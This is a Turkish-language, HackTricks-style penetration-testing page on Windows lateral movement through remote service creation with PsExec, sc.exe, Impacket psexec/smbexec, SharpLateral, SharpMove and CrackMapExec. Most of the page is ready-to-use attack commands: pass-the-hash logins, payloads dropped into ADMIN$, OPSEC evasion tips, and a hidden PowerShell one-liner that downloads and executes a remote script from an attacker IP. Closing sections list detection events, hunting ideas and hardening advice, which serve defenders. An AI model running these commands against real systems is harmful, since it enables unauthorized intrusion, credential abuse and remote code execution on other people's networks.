# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## Nasıl çalışırlar

Bu teknikler, hedef host üzerinde komut çalıştırmak için Windows Service Control Manager'ı (SCM) SMB/RPC üzerinden uzaktan kötüye kullanır. Genel akış şöyledir:

1. Hedefte kimlik doğrulaması yapın ve SMB (TCP/445) üzerinden ADMIN$ paylaşımına erişin.
2. Bir executable kopyalayın veya servisin çalıştıracağı bir LOLBAS command line belirtin.
3. Bu komuta veya binary'ye işaret eden bir servisi, SCM üzerinden uzaktan oluşturun (MS-SCMR over \PIPE\svcctl).
4. Payload'u çalıştırmak için servisi başlatın ve isteğe bağlı olarak stdin/stdout'u named pipe üzerinden yakalayın.
5. Servisi durdurun ve temizleyin (servisi ve bırakılan binary'leri silin).

Gereksinimler/prereqs:
- Hedefte Local Administrator (SeCreateServicePrivilege) veya hedefte açık service creation hakları.
- SMB (445) erişilebilir olmalı ve ADMIN$ paylaşımı kullanılabilir durumda olmalı; Remote Service Management host firewall üzerinden izinli olmalı.
- UAC Remote Restrictions: local accounts kullanıldığında, built-in Administrator veya LocalAccountTokenFilterPolicy=1 kullanılmadıkça token filtering ağ üzerinden admin erişimini engelleyebilir.
- Kerberos vs NTLM: hostname/FQDN kullanmak Kerberos'u etkinleştirir; IP ile bağlanmak genellikle NTLM'e geri döner (ve hardened ortamlarda engellenebilir).

### sc.exe ile Manual ScExec/WinExec

Aşağıdaki örnek, minimal bir service-creation yaklaşımını gösterir. Service image, bırakılan bir EXE veya cmd.exe ya da powershell.exe gibi bir LOLBAS olabilir.
```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```
Notlar:
- Service olmayan bir EXE başlatılırken timeout hatası bekleyin; execution yine de gerçekleşir.
- Daha OPSEC-friendly kalmak için fileless commands (`cmd /c`, `powershell -enc`) kullanmayı veya bırakılan artifact'leri silmeyi tercih edin.

Daha ayrıntılı adımları şurada bulabilirsiniz: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## Araçlar ve örnekler

### Sysinternals PsExec.exe

- SMB kullanarak ADMIN$ içine PSEXESVC.exe bırakan, geçici bir service kuran (varsayılan ad PSEXESVC) ve I/O'yu named pipes üzerinden proxy'leyen klasik bir admin aracıdır.
- Kullanım örnekleri:<sup>[[1]](#references)</sup>
```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```
- Sysinternals Live üzerinden WebDAV ile doğrudan çalıştırabilirsiniz:
```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```
OPSEC
- Servis yükleme/kaldırma olayları bırakır (servis adı, `-r` kullanılmadığında genellikle PSEXESVC olur) ve çalıştırma sırasında `C:\Windows\PSEXESVC.exe` oluşturur.

### Impacket psexec.py (PsExec-like)

- Embedded RemCom-like bir servis kullanır. ADMIN$ üzerinden geçici bir servis binary'si (genellikle rastgeleleştirilmiş adla) bırakır, bir servis oluşturur (varsayılan genellikle RemComSvc) ve I/O'yu bir named pipe üzerinden proxy'ler.
```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```
Artifacts
- C:\Windows\ içinde geçici bir EXE (8 rastgele karakter). Service name, üzerine yazılmadığı sürece varsayılan olarak RemComSvc olur.

### Impacket smbexec.py (SMBExec)

- cmd.exe başlatan ve I/O için named pipe kullanan geçici bir service oluşturur. Genellikle tam bir EXE payload bırakmaktan kaçınır; command execution yarı etkileşimlidir.
```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```
### SharpLateral and SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#), service-based exec dahil olmak üzere birkaç lateral movement methodunu uygular.
```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```
- [SharpMove](https://github.com/0xthirteen/SharpMove), bir komutu uzaktan çalıştırmak için service modification/creation içerir.
```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```
- Ayrıca farklı backend'ler (psexec/smbexec/wmiexec) üzerinden execute etmek için CrackMapExec kullanabilirsiniz:
```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```
## OPSEC, tespit ve izler

PsExec benzeri teknikler kullanılırken oluşan tipik host/ağ izleri:
- Kullanılan admin hesabı için hedefte Security 4624 (Logon Type 3) ve 4672 (Special Privileges) olayları.
- ADMIN$ erişimini ve service binary'lerinin oluşturulmasını/yazılmasını gösteren Security 5140/5145 File Share ve File Share Detailed olayları (ör. PSEXESVC.exe veya rastgele 8 karakterli .exe).
- Hedefte Security 7045 Service Install: PSEXESVC, RemComSvc veya özel service adları (-r / -service-name).
- services.exe veya service image için Sysmon 1 (Process Create), 3 (Network Connect), C:\Windows\ içindeki dosyalar için 11 (File Create), \\.\pipe\psexesvc, \\.\pipe\remcom_* veya rastgele eşdeğerleri gibi pipe'lar için 17/18 (Pipe Created/Connected).
- Sysinternals EULA için operator host üzerinde Registry izi: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 (bastırılmamışsa).

Hunting fikirleri
- ImagePath içinde cmd.exe /c, powershell.exe veya TEMP konumları bulunan service install işlemleri için alert oluşturun.
- ParentImage değeri C:\Windows\PSEXESVC.exe olan veya services.exe alt öğesi olarak LOCAL SYSTEM ile çalışan shell'leri başlatan process creation olaylarını arayın.
- -stdin/-stdout/-stderr ile biten veya iyi bilinen PsExec clone pipe adlarını kullanan named pipe'ları işaretleyin.

## Yaygın hatalarda troubleshooting
- Service oluşturulurken Access is denied (5): gerçekten local admin olunmaması, local account'lar için UAC remote restrictions veya service binary path üzerinde EDR tamper protection.
- The network path was not found (53) veya ADMIN$ bağlantısı kurulamadı: firewall SMB/RPC'yi engelliyor ya da admin share'ler devre dışı.
- Kerberos başarısız oluyor ancak NTLM engellenmiş: hostname/FQDN ile (IP yerine) bağlanın, uygun SPN'leri doğrulayın veya Impacket kullanırken ticket'larla -k/-no-pass sağlayın.
- Service start zaman aşımına uğruyor ancak payload çalıştı: gerçek bir service binary'si kullanılmıyorsa bu beklenen bir durumdur; çıktıyı bir dosyaya kaydedin veya canlı I/O için smbexec kullanın.

## Hardening notları
- Windows 11 24H2 ve Windows Server 2025, outbound (ve Windows 11 inbound) bağlantılar için varsayılan olarak SMB signing gerektirir. Bu durum geçerli credential'larla yapılan meşru PsExec kullanımını bozmaz; ancak unsigned SMB relay abuse'u önler ve signing desteklemeyen cihazları etkileyebilir.<sup>[[2]](#references)</sup>
- Yeni SMB client NTLM blocking özelliği (Windows 11 24H2/Server 2025), IP ile veya Kerberos kullanmayan server'lara bağlanırken NTLM fallback'i engelleyebilir. Hardened ortamlarda bu, NTLM tabanlı PsExec/SMBExec'i bozacaktır; Kerberos kullanın (hostname/FQDN) veya meşru olarak gerekiyorsa exception'lar yapılandırın.<sup>[[2]](#references)</sup>
- Least privilege ilkesi: local admin üyeliğini en aza indirin, Just-in-Time/Just-Enough Admin yaklaşımını tercih edin, LAPS'ı zorunlu tutun ve 7045 service install işlemlerini izleyip bunlar için alert oluşturun.

## Ayrıca bkz.

- WMI tabanlı remote exec (genellikle daha fazla fileless):

{{#ref}}
./wmiexec.md
{{#endref}}

- WinRM tabanlı remote exec:

{{#ref}}
./winrm.md
{{#endref}}

## References

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [SMB security hardening in Windows Server 2025 & Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [Using Credentials to Own Windows Boxes - Part 2 (PSExec and Services)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

{{#include ../../banners/hacktricks-training.md}}
